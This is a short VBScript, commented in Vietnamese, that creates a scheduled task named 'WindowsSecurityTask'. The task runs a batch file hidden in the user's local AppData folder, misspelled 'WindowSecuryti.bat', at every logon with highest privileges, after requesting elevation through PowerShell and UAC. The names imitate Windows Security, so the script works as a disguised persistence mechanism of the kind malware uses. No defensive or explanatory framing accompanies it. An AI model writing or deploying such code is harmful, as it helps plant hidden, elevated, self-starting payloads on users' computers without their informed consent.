' onadmin.vbs — tạo task WindowsSecurityTask với quyền admin
Option Explicit

Dim shell, batPath, taskCommand
Set shell = CreateObject("WScript.Shell")

batPath = shell.ExpandEnvironmentStrings("%LOCALAPPDATA%") & "\WindowSecuryti.bat"

taskCommand = "schtasks /create /tn ""WindowsSecurityTask"" /tr """ & batPath & """ /sc onlogon /rl highest /f"

' Gọi lệnh cmd với quyền admin để tạo task
shell.Run "powershell -Command ""Start-Process cmd -ArgumentList '/c " & taskCommand & "' -Verb RunAs""", 1, True
